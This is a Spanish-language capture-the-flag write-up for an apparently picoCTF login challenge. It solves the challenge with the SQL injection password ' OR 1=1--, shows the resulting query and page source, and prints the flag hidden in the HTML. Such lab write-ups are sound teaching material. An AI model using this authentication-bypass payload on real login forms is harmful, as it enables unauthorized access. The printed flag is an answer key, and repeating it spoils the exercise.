
## Descripción

*Can you login to this website?
Additional details will be available after launching your challenge instance.*

*Try to login [here](http://saturn.picoctf.net:51426/).*

## Pistas

*`admin` is the user you want to login as.*

## Solución

```
### Log In

Username:admin

Password:' OR 1=1-- #Inyeccion sql como contraseña


#entras y te lleva a una pagina de loginphp
username: admin
password: ' OR 1=1--
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1--'

# Logged in! But can you see the flag, it is in plainsight.

#Inspeccionamos la pagina en ver codigo fuente y se encuentra la bandera
|---|
|<pre>username: admin|
||password: &#039; OR 1=1--|
||SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; OR 1=1--&#039;|
||</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>|
```

picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}

## Notas Adicionales 

*Inyeccion sql*
## Referencias 

http://saturn.picoctf.net:51426/
http://saturn.picoctf.net:58208/login.php